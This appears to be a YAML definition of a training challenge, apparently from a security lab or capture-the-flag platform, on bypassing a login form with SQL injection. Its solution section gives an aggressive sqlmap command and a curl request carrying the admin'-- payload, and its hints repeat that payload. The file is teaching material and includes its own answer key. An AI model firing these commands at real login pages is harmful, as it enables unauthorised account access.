difficulty: intermediate
points: 150
prerequisites:
  basics: 5
  web_security: 3

description: |
  You've discovered a login form at http://vulnerable-site.com/login.
  Your task is to perform a SQL injection to bypass the login.

setup:
  - echo "Creating vulnerable login page..."
  - echo "Database initialized with admin credentials"

solution:
  commands:
    - "sqlmap -u \"http://vulnerable-site.com/login\" --data=\"username=admin&password=*\" --level=5 --risk=3"
    - "curl -X POST http://vulnerable-site.com/login -d \"username=admin'--&password=any\""

task: |
  Bypass the login form using SQL injection techniques.
  Try to log in as the admin user without knowing the password.

hints:
  - "What happens if you enter a single quote in the username field?"
  - "Try using the SQL comment character after the username"
  - "The payload should look like: admin'--"

success_message: |
  Great job! You've successfully performed a SQL injection attack.
  This is a common vulnerability where user input is directly
  concatenated into SQL queries without proper sanitization.
